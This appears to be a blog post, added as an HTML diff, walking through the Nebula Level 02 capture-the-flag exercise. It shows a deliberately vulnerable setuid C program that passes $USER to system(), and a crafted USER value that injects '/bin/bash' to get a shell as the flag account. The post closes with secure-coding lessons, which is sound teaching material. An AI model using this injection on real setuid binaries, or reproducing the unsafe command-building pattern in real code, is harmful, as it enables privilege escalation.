@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    <title>Nebula Series - Level 02</title>
+  </head>
+  <body>
+    <div id='header'>
+      <img id='logo' src="/assets/image/mythical-bits-logo-1.png" alt="logo"/>
+      <h1> Mythical Bits </h1>
+    </div>
+    <hr />
+    <div id='container'>
+      <div id='nav'>
+  <a href="/index.html">Home</a>
+</div>
+<div class='post-container'>
+  <h3> Nebula Series - Level 02</h3>
+  <p>22 Apr 2020</p>
+  <hr class='post-title-line'/>
+  <!--more-->
+
+<p>Ok, so the first thing to understand is that you shouldn’t trust the user. If the application
+executes a command that is built either entirely or partially from user input, it’s vulnerable to
+command execution.</p>
+
+<p>Inspecting the executable in the flag account’s home directory <code class="language-plaintext highlighter-rouge">/home/flag02</code> we again see that it
+is <code class="language-plaintext highlighter-rouge">setuid</code> and is owned by <code class="language-plaintext highlighter-rouge">flag02</code>.</p>
+
+<p>To make our lives easier, we are also provided with the source:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+
+  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+
+  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+
+  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+
+  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"/bin/echo %s is cool"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"USER"</span><span class="p">));</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"about to call system(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+
+  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Again, the application sets our <strong>REAL</strong> uid &amp; gid to our <strong>EFFECTIVE</strong> uid &amp; gid which means
+as far as the running process is concerned, we are user <code class="language-plaintext highlighter-rouge">flag02</code>; now we just need to get it to do
+our bidding.</p>
+
+<p>The application builds up the command using the value in the <code class="language-plaintext highlighter-rouge">$USER</code> environment variable, stores it in the
+buffer, and eventually executes it.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"/bin/echo %s is cool"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"USER"</span><span class="p">));</span>
+<span class="p">...</span>
+<span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Our goal is to craft a value for the <code class="language-plaintext highlighter-rouge">$USER</code> variable such that we are provided with a shell when the command is run.</p>
+
+<p>We can short circuit the call to <code class="language-plaintext highlighter-rouge">/bin/echo</code> with <code class="language-plaintext highlighter-rouge">&amp;&amp;</code>, invoke <code class="language-plaintext highlighter-rouge">/bin/bash</code>, and comment out the rest
+of the command with <code class="language-plaintext highlighter-rouge">#</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ USER</span><span class="o">=</span><span class="s1">'&amp;&amp; /bin/bash #'</span> /home/flag02/flag02
+</code></pre></div></div>
+
+<p>The resulting command is</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/echo <span class="o">&amp;&amp;</span> /bin/bash <span class="c"># is cool</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">#</code> at the end is crucial because without it <code class="language-plaintext highlighter-rouge">bash</code> would try to execute a non-existent file called <code class="language-plaintext highlighter-rouge">is</code> and fail.
+Instead, we are presented with a shell as <code class="language-plaintext highlighter-rouge">flag02</code> which we can verify with <code class="language-plaintext highlighter-rouge">whoami</code> if we’re in doubt.</p>
+
+<p>To complete the level we use our escalated privileges to run getflag</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>getflag
+
+<span class="s2">"You have successfully executed getflag on a target account"</span>
+</code></pre></div></div>
+
+<p>In summary:</p>
+
+<ul>
+  <li>assume all input is malicious</li>
+  <li>if possible, avoid dynamically composing commands with user provided data</li>
+</ul>
+
+</div>
+
+    </div>
+  </body>
+</html>
+
